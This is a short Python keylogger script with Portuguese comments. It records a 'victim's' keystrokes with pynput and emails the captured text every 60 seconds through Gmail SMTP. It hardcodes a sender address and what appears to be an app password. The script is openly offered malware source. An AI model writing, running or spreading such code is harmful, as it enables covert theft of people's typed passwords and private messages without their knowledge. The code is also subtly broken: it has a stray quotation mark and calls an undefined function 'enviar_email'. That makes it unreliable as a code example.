from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#1. Configurações de e-mail
EMAIL_ORIGEM = "testekeylogger123@gmail.com"
EMAIL_DESTINO = "testekeylogger123@gmail.com"
SENHA_EMAIL = "wujv xeyz smbi qnxy"

#2. Função para capturar o conteudo do log e enviar o e-mail
def send_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
            
        log = ""

#3. Agendar o envio a cada 60 segundos
    Timer(60, send_email).start()

#4. Capturar o que está sendo digitado pela vitima
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass'

#5. Inicia o keylogger e o envio de e-mails automatico
send_email()
with keyboard.Listener(on_press=on_press) as listener:
        enviar_email()
        listener.join()
